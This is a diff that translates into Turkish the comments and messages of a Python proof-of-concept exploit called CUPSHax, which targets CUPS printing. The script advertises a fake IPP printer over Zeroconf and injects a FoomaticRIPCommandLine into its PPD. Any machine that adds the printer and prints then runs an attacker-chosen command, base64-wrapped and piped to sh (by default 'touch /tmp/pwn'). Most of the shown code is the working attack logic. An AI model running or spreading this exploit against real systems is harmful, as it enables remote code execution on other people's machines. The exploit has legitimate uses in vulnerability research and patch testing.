@@ -12,6 +12,7 @@ from ippserver.parsers import Enum, Boolean, Integer
 
 class Discovery:
     def __init__(self, printer_name, ip_address, port):
+        # Yazıcı keşfi için gerekli bilgileri başlat
         self.printer_name = printer_name
         self.printer_name_slug = Discovery.slugify_name(printer_name)
         self.ip_address = ip_address
@@ -19,9 +20,11 @@ class Discovery:
         self.zeroconf = None
 
     def slugify_name(name):
+        # Yazıcı adını URL-dostu hale getir
         return "".join([c if c.isalnum() else "_" for c in name])
 
     def create_ipp_printer_service(self):
+        # IPP yazıcı servisi için gerekli bilgileri oluştur
         # IPP over TCP (standard IPP service)
         service_type = "_ipp._tcp.local."
         service_name = f"{self.printer_name_slug}._ipp._tcp.local."
@@ -53,28 +56,33 @@ class Discovery:
         return service_info
 
     def register(self):
+        # Yazıcıyı Zeroconf ile kaydet
         self.zeroconf = Zeroconf()
         self.service_info = self.create_ipp_printer_service()
         self.zeroconf.register_service(self.service_info)
 
     def close(self):
+        # Zeroconf servisini kapat
         if self.zeroconf is None:
             return
         self.zeroconf.unregister_service(self.service_info)
         self.zeroconf.close()
 
     def __del__(self):
+        # Nesne silinirken servisi kapat
         self.close()
 
 
 class HaxPrinter(StatelessPrinter):
     def __init__(self, command, name):
+        # Sahte yazıcı için gerekli bilgileri başlat
         self.cups_filter = '*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 foomatic-rip"'
         self.foomatic_rip = f'*FoomaticRIPCommandLine: {command} #'
         self.name = name
         super(HaxPrinter, self).__init__()
 
     def minimal_attributes(self):
+        # Minimum gerekli yazıcı özelliklerini döndür
         return {
             # This list comes from
             # https://tools.ietf.org/html/rfc2911
@@ -92,6 +100,7 @@ class HaxPrinter(StatelessPrinter):
         }
 
     def printer_list_attributes(self):
+        # Tüm yazıcı özelliklerini döndür
         attr = {
             # rfc2911 section 4.4
             (
@@ -236,16 +245,18 @@ class HaxPrinter(StatelessPrinter):
         return attr
 
     def handle_postscript(self, _ipp_request, _postscript_file):
+        # PostScript dosyalarını işle (bu örnekte boş bırakılmış)
         pass
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="CUPSHax: A CUPS PPD injection PoC")
+    # Komut satırı argümanlarını ayrıştır
+    parser = argparse.ArgumentParser(description="CUPSHax: CUPS PPD enjeksiyon PoC'si")
     
-    parser.add_argument("--name", default="RCE Printer", help="The name to use (default: RCE Printer)")
-    parser.add_argument("--ip", required=True, help="The IP address of the machine running this script")
-    parser.add_argument("--command", default="touch /tmp/pwn", help="The command to execute (default: 'touch /tmp/pwn')")
-    parser.add_argument("--port", type=int, default=8631, help="The port to connect on (default: 8631)")
-    parser.add_argument("--base64", action=argparse.BooleanOptionalAction, default=True, help="Wrap the command in base64 (default: enabled)")
+    parser.add_argument("--name", default="RCE Printer", help="Kullanılacak yazıcı adı (varsayılan: RCE Printer)")
+    parser.add_argument("--ip", required=True, help="Bu betiği çalıştıran makinenin IP adresi")
+    parser.add_argument("--command", default="touch /tmp/pwn", help="Çalıştırılacak komut (varsayılan: 'touch /tmp/pwn')")
+    parser.add_argument("--port", type=int, default=8631, help="Bağlanılacak port (varsayılan: 8631)")
+    parser.add_argument("--base64", action=argparse.BooleanOptionalAction, default=True, help="Komutu base64 ile kodla (varsayılan: etkin)")
     
     return parser.parse_args()
 
@@ -253,23 +264,23 @@ def main():
     args = parse_args()
     command = args.command
     if args.base64:
-        print("[+] Wrapping command in base64...")
+        print("[+] Komut base64 ile kodlanıyor...")
         command = f"echo {b64encode(command.encode()).decode()}|base64 -d|sh"
 
-    print(f"[+] Command: {command}")
+    print(f"[+] Komut: {command}")
     printer = HaxPrinter(command, args.name)
     discovery = Discovery(args.name, args.ip, args.port)
     
-    # Start a discovery thread
+    # Keşif işlemini ayrı bir thread'de başlat
     discovery_thread = Thread(target=discovery.register)
     discovery_thread.start()
 
     server = IPPServer((args.ip, args.port), IPPRequestHandler, printer)
     try:
-        print(f"[+] Starting IPP server on {args.ip}:{args.port}...")
+        print(f"[+] IPP sunucusu {args.ip}:{args.port} üzerinde başlatılıyor...")
         server.serve_forever()
     except KeyboardInterrupt:
-        print("[+] Stopping script...")
+        print("[+] Betik durduruluyor...")
 
 if __name__ == "__main__":
     main()
